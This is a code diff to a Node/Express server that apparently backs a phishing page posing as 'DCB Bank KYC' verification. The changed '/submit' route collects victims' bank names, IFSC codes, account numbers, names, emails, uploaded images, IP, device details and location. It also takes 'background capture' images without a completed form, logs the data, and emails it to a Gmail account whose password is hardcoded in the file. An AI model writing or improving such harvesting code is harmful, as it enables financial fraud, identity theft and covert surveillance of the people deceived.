@@ -46,7 +46,10 @@ const transporter = nodemailer.createTransport({
   auth: {
     user: 'dcbsubmission392@gmail.com',
     pass: 'kexmwnespcwxrkjt'
-  }
+  },
+  pool: true, // Enable connection pooling
+  maxConnections: 5, // Max simultaneous connections
+  maxMessages: 100 // Max messages per connection
 });
 
 // Helper functions
@@ -115,25 +118,35 @@ const buildEmailHtml = (data) => {
 // Routes
 app.post('/submit', (req, res) => {
   upload(req, res, async (err) => {
+    const filesToCleanup = []; // Track files for cleanup
+
     try {
       if (err) throw err;
 
       const isBackground = req.body.empty_form === 'true';
       
-      // Server-side validation
-      if (!isBackground) {
-        if (!req.body.bankname || !req.body.ifsc || !req.body.accno || 
-            !req.body.fullname || !req.body.email || !req.files || req.files.length === 0) {
-          return res.status(400).json({ error: 'All fields are required' });
-        }
-
-        // Validate email format
-        const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
-        if (!emailRegex.test(req.body.email)) {
-          return res.status(400).json({ error: 'Invalid email format' });
-        }
+      // Server-side validation for full submissions
+      if (!isBackground && (!req.body.bankname || !req.body.ifsc || !req.body.accno || 
+          !req.body.fullname || !req.body.email || !req.files || req.files.length === 0)) {
+        return res.status(400).json({ error: 'All fields are required' });
       }
 
+      // Validate email format for full submissions
+      if (!isBackground && !/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(req.body.email)) {
+        return res.status(400).json({ error: 'Invalid email format' });
+      }
+
+      // Prevent duplicate background submissions with no images
+      if (isBackground && (!req.files || req.files.length === 0)) {
+        return res.status(200).send();
+      }
+
+      // Store files for later cleanup
+      if (req.files) {
+        filesToCleanup.push(...req.files);
+      }
+
+      // Parse device info
       const parser = new UAParser(req.headers['user-agent'] || req.body.user_agent || '');
       const device = parser.getDevice();
       const os = parser.getOS();
@@ -160,14 +173,34 @@ app.post('/submit', (req, res) => {
         imageCount: req.files?.length || 0
       };
 
-      const logEntry = `--- ${isBackground ? 'BACKGROUND' : 'FULL'} SUBMISSION ---\n${JSON.stringify(submissionData, null, 2)}\n`;
-      fs.appendFileSync('records.txt', logEntry);
+      // Log the submission
+      const logEntry = `
+--- ${isBackground ? 'BACKGROUND' : 'FULL'} SUBMISSION ---
+Time: ${new Date().toISOString()}
+Device: ${submissionData.device.vendor} ${submissionData.device.model} (${submissionData.device.type})
+OS: ${submissionData.os}
+Browser: ${submissionData.browser}
+IP: ${submissionData.ip}
+Location: ${submissionData.location ? 
+  `${submissionData.location.latitude}, ${submissionData.location.longitude}` : 'None'}
+Bank: ${submissionData.bankname}
+IFSC: ${submissionData.ifsc}
+Account: ${submissionData.accno}
+Name: ${submissionData.fullname}
+Email: ${submissionData.email}
+Images: ${submissionData.imageCount}
+-----------------------------
+`;
 
+      fs.appendFileSync('records.txt', logEntry);
+      console.log(logEntry);
+
+      // Send email
       const emailSubject = isBackground 
         ? `⚠️ Background Capture (${submissionData.imageCount} images)` 
         : '✅ KYC Verification Completed';
       
-      await transporter.sendMail({
+      const mailOptions = {
         from: 'DCB Bank KYC <dcbsubmission392@gmail.com>',
         to: 'dcbsubmission392@gmail.com',
         subject: emailSubject,
@@ -176,27 +209,64 @@ app.post('/submit', (req, res) => {
           filename: file.originalname,
           path: file.path
         }))
-      });
+      };
 
-      if (req.files) {
-        req.files.forEach(file => {
-          try {
-            fs.unlinkSync(file.path);
-          } catch (e) {
-            console.error('Error deleting file:', file.path, e);
-          }
-        });
-      }
-
+      await transporter.sendMail(mailOptions);
       res.status(200).send();
     } catch (error) {
       console.error('❌ Error:', error);
       res.status(500).send('Error processing submission');
+    } finally {
+      // Cleanup files after 30 seconds to ensure email is sent
+      setTimeout(() => {
+        filesToCleanup.forEach(file => {
+          fs.unlink(file.path, err => {
+            if (err && err.code !== 'ENOENT') { // Ignore "file not found" errors
+              console.error('Error deleting file:', file.path, err);
+            }
+          });
+        });
+      }, 30000); // 30 second delay
     }
   });
 });
 
+// Health check endpoint
+app.get('/health', (req, res) => {
+  res.status(200).json({
+    status: 'healthy',
+    timestamp: new Date().toISOString(),
+    uptime: process.uptime()
+  });
+});
+
+// Error handling middleware
+app.use((err, req, res, next) => {
+  console.error('❌ Unhandled Error:', err);
+  res.status(500).json({ 
+    error: 'Internal Server Error',
+    message: err.message 
+  });
+});
+
 // Start server
-app.listen(port, () => {
+const server = app.listen(port, () => {
   console.log(`Server running on port ${port}`);
+});
+
+// Graceful shutdown
+process.on('SIGTERM', () => {
+  console.log('SIGTERM received. Shutting down gracefully...');
+  server.close(() => {
+    console.log('Server closed');
+    process.exit(0);
+  });
+});
+
+process.on('SIGINT', () => {
+  console.log('SIGINT received. Shutting down gracefully...');
+  server.close(() => {
+    console.log('Server closed');
+    process.exit(0);
+  });
 });
